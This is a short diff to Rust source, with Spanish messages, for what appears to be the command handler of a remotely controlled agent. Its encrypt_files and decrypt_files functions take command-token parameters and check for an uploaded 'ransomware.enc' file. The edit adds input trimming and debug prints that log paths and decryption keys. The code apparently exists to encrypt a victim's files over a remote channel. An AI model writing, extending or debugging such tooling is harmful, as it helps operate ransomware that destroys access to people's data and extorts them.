@@ -512,8 +512,10 @@ fn encrypt_files(params: &str) -> String {
             return format!("__ERROR__:Parámetros inválidos. Uso: __ENCRYPT__:ruta|max_depth{}", DELIMITER);
         }
         
-        let path = parts[0];
-        let max_depth: u32 = parts[1].parse().unwrap_or(5);
+        let path = parts[0].trim();
+        let max_depth: u32 = parts[1].trim().parse().unwrap_or(5);
+        
+        println!("DEBUG: encrypt_files - path='{}', max_depth={}", path, max_depth);
         
         // Verificar que existan los archivos subidos
         if !Path::new("ransomware.enc").exists() {
@@ -654,9 +656,11 @@ fn decrypt_files(params: &str) -> String {
             return format!("__ERROR__:Parámetros inválidos. Uso: __DECRYPT__:ruta|key|max_depth{}", DELIMITER);
         }
         
-        let path = parts[0];
-        let key_hex = parts[1];
-        let max_depth: u32 = parts[2].parse().unwrap_or(5);
+        let path = parts[0].trim();
+        let key_hex = parts[1].trim();
+        let max_depth: u32 = parts[2].trim().parse().unwrap_or(5);
+        
+        println!("DEBUG: decrypt_files - path='{}', key_hex='{}', max_depth={}", path, key_hex, max_depth);
         
         // Verificar que existan los archivos subidos
         if !Path::new("ransomware.enc").exists() {
